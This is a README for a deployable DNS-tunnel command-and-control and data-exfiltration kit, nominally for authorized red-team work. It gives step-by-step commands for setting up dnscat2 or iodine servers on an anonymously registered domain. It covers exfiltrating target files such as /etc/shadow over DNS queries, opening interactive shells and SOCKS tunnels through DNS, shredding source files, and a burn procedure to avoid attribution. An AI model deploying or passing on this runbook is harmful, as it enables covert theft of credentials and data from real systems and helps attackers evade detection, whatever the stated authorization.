# GHOST-HUNT // C2 KIT-DNS — DNS Tunnel (Deployable)

> **Source Playbook:** `GHOST-HUNT-C2-ENVIRONMENT.md` §12.2 — DNS C2, 5 Minutes to Full Tunnel
> **Status:** READY TO DEPLOY
> **Use:** Authorized red team / adversary-emulation engagements only.
> **Sibling kit:** `GHOST-HUNT-C2-KIT/` (HTTPS receiver, §12.1)
> **Measured capacity:** `../VALIDATION.md` — ceiling-tested at 64 KB / 1,748 queries, **zero loss**

DNS tunneling has the **lowest detection profile** of the C2 channels — every query
looks like ordinary DNS traffic. Bandwidth is low (~25 bytes/payload chunk), so use
it for small, high-value data or when the target has no tooling and nothing but DNS
egress (see §12.4 decision matrix).

---

## 1. Architecture

```
[TARGET] ── DNS TXT query <chunk>.x<seq>.<fileid>.<DOMAIN> ──► [Authoritative NS = dnscat2 on VPS :53]
              base32 + XOR-encrypted                                  │
              chunk ≤40 chars, 1–5s jitter                    session log / tcpdump capture
              fileid = 16-hex content hash (multi-file safe)
```

| Component | File | Runs On |
|---|---|---|
| Server bootstrap | `bootstrap-dns-server.sh` | Ubuntu 22.04+ VPS (root) — installs & runs dnscat2 |
| Server config | `server-dns.env.example` → `server-dns.env` | VPS |
| Exfil client | `dns_exfil.py` | Target — **stdlib only, no installs** |
| Local listener | `dns_handler.py` | Local test double / capture server (harness) |
| Pull / decrypt | `dns_pull.py` | Operator workstation |
| Takedown | `burn-dns.sh` | C2 server (root) |
| Local smoke test | `test/local_dns_harness.py` (+ `test/run_local_dns_test.sh`) | Any box with Python 3 |

---

## 2. Local Smoke Test — verify the channel before touching a VPS

Proves the whole DNS pipeline — XOR + base32 → chunking → DNS queries →
capture → decode → byte-identical file — on localhost. **No pip installs, no DNS
server, no domain.** The client's `--server/--port` mode sends raw DNS packets
straight to `dns_handler.py` (a minimal UDP DNS listener).

```bash
# from GHOST-HUNT-C2-KIT-DNS/
python3 test/local_dns_harness.py            # 2 KB file, ~70 chunks
python3 test/local_dns_harness.py --size-kb 20 --chunk 60
python3 test/local_dns_harness.py --keep     # retain temp artifacts
# Windows:  python test\local_dns_harness.py
```

**Exit 0 = PASS** — the encode/emit/capture/decode chain is sound → safe to deploy (§3).

> **Measured throughput** (2 → 20 → 64 KB, 40 → 60-char chunks) and reproduction
> commands live in [`../VALIDATION.md`](../VALIDATION.md) §3. The nightly CI
> stress job re-verifies the 64 KB ceiling automatically.

---

## 3. Deployment Runbook

### 3.1 Pre-Stage

| Item | Requirement |
|---|---|
| VPS | Static IP, UDP 53 open (Crypto VPS — any OS with Ruby) |
| Domain | Full control, anonymous (Njalla / Monero) |
| NS glue | `ns1.<domain>` + `ns2.<domain>` → VPS IP, set **before** deploy |
| Shared secret | `pwgen -s 48 1` — used for Method B XOR key + Method C iodine |

### 3.2 Deploy (on the VPS)

```bash
cp server-dns.env.example server-dns.env
$EDITOR server-dns.env       # set DOMAIN (+ optionally PASSWORD)
bash bootstrap-dns-server.sh server-dns.env
```

Bootstrap does: ruby + dnscat2 (gem) → firewall (deny-all, allow 53/udp+tcp) →
dnscat2 behind systemd as `nobody` → banner with NS-glue reminder.

> **Playbook fixes applied:** dnscat2's gem bin path varies across distros, so the
> script resolves it via `command -v` with a `/var/lib/gems` fallback instead of
> hardcoding `/usr/local/bin/dnscat2`.

### 3.3 Exfil — three methods (playbook §12.2.3)

**Method A — dnscat2 full tunnel** (needs a binary on the target):

```bash
./dnscat2 <YOUR_DOMAIN>          # interactive shell through DNS
# then: shell -> session -i 1
```

**Method B — Python stdlib DNS exfil** (nothing to install; recommended):

```bash
# on target — paste dns_exfil.py, then:
python3 dns_exfil.py --domain <YOUR_DOMAIN> --password <secret> /etc/shadow
# --jitter 1.0 default (1–5s); --keep to avoid shredding the source; --chunk 40
```

Encrypts (XOR w/ sha256-derived key) → base32 → 40-char chunks →
`<chunk>.x<seq>.<fileid>.<DOMAIN>` TXT queries via the system resolver
(`fileid` is a 16-hex content hash so multiple files in one run stay distinct
on the capture side). NXDOMAIN responses are expected and ignored — the server
logs the query itself. Multiple files are supported: `dns_exfil.py a b c`.

**Method C — iodine IP-over-DNS full tunnel:**

```bash
# server (on VPS):
iodined -f -P "<secret>" -c 10.0.0.1 <YOUR_DOMAIN>
# client (on target):
iodine -f -P "<secret>" <YOUR_DOMAIN>     # tun0 on 10.0.0.2
# ssh -D 1080 user@10.0.0.1               # SOCKS through DNS
```

### 3.4 Capture & Pull (operator workstation)

With dnscat2, queries land in its session log; with tcpdump, capture and extract
the QNAME chunk label (first) and fileid label (third) per query into
`chunk_<fileid>_<seq>.txt` files. Then:

```bash
DNS_PASSWORD=<secret> python3 dns_pull.py --dir <capture-dir> --out recovered
```

Decodes base32 (padding restored), XOR-decrypts, and warns on data loss via two
independent checks:

1. **Seq-gap scan** — lists the exact missing chunk sequence numbers
   (`WARNING missing chunks [...]`), including a lost first chunk (seq 0).
   *Inherently blind to tail loss* (its upper bound is the highest *received*
   seq), which the integrity check below backstops.
2. **Content-hash integrity check** — the capture filename's `<fileid>` IS
   `sha256(source)[:16]` (written by `dns_exfil.py`), so after decryption the
   puller verifies `sha256(recovered)[:16] == fileid`. Any mismatch prints
   `INTEGRITY FAILED — recovered bytes do not match the fileid content hash
   (chunk loss or wrong password)`. This catches **every** loss class —
   middle, tail, and multi-tail — plus wrong-password decodes, which the gap
   scan cannot see.

Either warning means the recovered bytes are corrupt: the puller still writes
`recovered/<fileid>.bin` (partial data for triage) but the warning is the signal
that the capture is incomplete. Output is one file per exfil'd file (a legacy
single-file capture named `chunk_<seq>.txt` still decodes to
`recovered/recovered.bin`).

**Exit codes:** the puller exits `0` by default even when a warning fired — the
corrupt-but-complete file is written so you can triage partial data. Automated
pipelines that must never silently ingest corrupt data should pass `--strict`,
which flips the exit to `2` when either check warns (operational errors like a
missing capture dir still return `1`). Default behavior is unchanged, so
`--strict` is purely opt-in:

```bash
python3 dns_pull.py --dir <capture-dir> --password <secret> --strict   # exit 2 = corrupt data
python3 dns_pull.py --dir <capture-dir> --password <secret>            # exit 0 (triage mode)
```

> **Version note:** `dns_exfil.py`, `dns_handler.py`, and `dns_pull.py` must be
> upgraded as a set — an old puller cannot read `chunk_<fileid>_<seq>.txt`
> captures (they are skipped as malformed). The integrity check is a
> **puller-side-only addition** (no wire-format change), so it is backward
> compatible: a current `dns_pull.py` verifies both new and pre-existing
> captures, and an old puller still decodes current captures (minus the
> integrity warning).

### 3.5 Burn (after data verified)

```bash
bash burn-dns.sh
```

Stops + disables dnscat2, removes the unit, clears history. Then let the domain
expire or transfer to a burner registrar, and terminate the VPS.

---

## 4. Decision Matrix (playbook §12.4)

| Scenario | Use |
|---|---|
| Target has no tools, DNS-only egress | **DNS C2, Method B** — paper-thin footprint |
| High-security environment | **Method B** with tight jitter (2–5s) |
| Need a full interactive tunnel | Method A (dnscat2) or C (iodine) |
| Need fast, high-bandwidth exfil | HTTPS kit (§12.1) instead |

---

## 5. Safety Checklist (authorized use only)

- [ ] I own the target, or have **written authorization** covering this infrastructure and target.
- [ ] Domain/VPS have no clean attribution back to me.
- [ ] Shared secret generated fresh per operation; keys never reused.
- [ ] Burn procedure rehearsed; domain registered anonymously.

> **Note:** `dns_exfil.py` shreds the source file after exfiltration unless `--keep`.
> Unauthorized use of these scripts is illegal. Authorized engagements only.

---

## 6. Troubleshooting

| Symptom | Fix |
|---|---|
| Harness: port busy (5353 is mDNS/Bonjour on many desktops) | Harness auto-scans to the next free port; force one with `--port 9090` (any high port, no admin needed) |
| Harness: hash mismatch | Missing chunks — the harness prints the captured chunk count; re-run with `--keep` and inspect `incoming/` |
| dnscat2 won't start | `journalctl -u dns-c2 -e`; confirm nothing else binds UDP 53 (`ss -ulpn`) |
| Queries never reach the VPS | NS glue not propagated — `dig @<VPS-IP> TXT test.<DOMAIN>`; check registrar + `ufw status` (53/udp) |
| Client sends but no capture | Method B via resolver needs the domain's NS pointed at the VPS; verify `dig +short <DOMAIN> NS` |
| Client: `--chunk` too big | DNS labels cap at 63 chars — keep ≤ 60; total query must stay < 255 |

---

*END C2 KIT-DNS README*
